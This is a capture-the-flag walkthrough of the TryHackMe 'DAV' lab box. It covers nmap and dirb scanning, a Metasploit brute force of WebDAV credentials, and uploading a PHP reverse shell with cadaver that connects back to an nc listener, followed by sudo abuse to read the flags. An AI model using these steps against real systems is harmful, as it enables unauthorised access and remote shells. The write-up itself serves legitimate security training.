# DAV

![DAV](/assets/images/tryhackme/DAV/davbox.png)

## Nmap

Step one will be to conduct an nmap scan of the target using the following command:
```
nmap -sV -A -T4 <target-IP> 
```

![NMAP](/assets/images/tryhackme/DAV/nmap1.png)

There is only a web server running displaying Apache so lets check if there is
something we can find with dirb.
```
dirb <target-IP>
```

![DIRB](/assets/images/tryhackme/DAV/dirb.png)

Here we see that webdev is enabled but displays a 401.

![WEBDAV](/assets/images/tryhackme/DAV/webdav1.png)
Now since I couldn't spot anything else of interest or other useful pages
that could provide us with credentials I'll try to bruteforce a login
using metasploit.

Start up metasploit and use this module.
```
use auxiliary/scanner/http/http_login
```
Adjust the following:
 * AUTHI_PATH
    - /webdav
 * RHOSTS
    - <target-IP>
 * STOP_ON_SUCCESS
    - True
use "run" or "exploit" to begin the bruteforce.

![LOGIN](/assets/images/tryhackme/DAV/login.png)
Found the credentials! Now we can access the login page at webdav.

![LOGGEDIN](/assets/images/tryhackme/DAV/entry1.png)
Now that we're in we can see a passwd file but it holds a hashed password.
But we're already in so who cares, but SSH is disabled on this system and no way in.
However we can check what files are enabled on webdav, since we have credentials we
can upload and download files.

Run this command, what files can be used?
```
davtest -auth <user>:<password> -url http://<TARGET-IP>/webdav
```

Now we're gonna grab a webshell and upload it to the website and we can execute
it from the webdav index.

```
cp /usr/share/webshells/php/php-reverse-shell.php ./
```
This command copies the reverse shell to your current directory.
Now we must edit some options in this file before we execute.

![PHPSHELL](/assets/images/tryhackme/DAV/phpedit.png)
Change the IP address of your machine on line 49.
Don't forget to save it.

Now open another terminal and start a listener.
```
nc -lvnp 1234
```

Time to upload our shell.
```
cadaver http://<TARGET-IP>/webdav/
```
Login with the credentials found earlier.

![CADAVER](/assets/images/tryhackme/DAV/cadaver.png)
Simply upload your shell like this
```
put <SHELL.PHP>
```
![SHELLUPLOAD](/assets/images/tryhackme/DAV/shellupload.png)
It worked!
Now simply click on the shell file that was uploaded and it will run the backdoor.
Now we check back on our listener we uploaded.

![FOOTHOLD](/assets/images/tryhackme/DAV/foothold.png)
Great we're in.
Lets see if we can run any sudo commands.
```
sudo -l
```
![SUDO](/assets/images/tryhackme/DAV/sudol.png)
Great, we can run sudo cat and grab the root.txt and user.txt!

![FLAGS](/assets/images/tryhackme/DAV/flags.png)
Nice, machine DAV pwned.

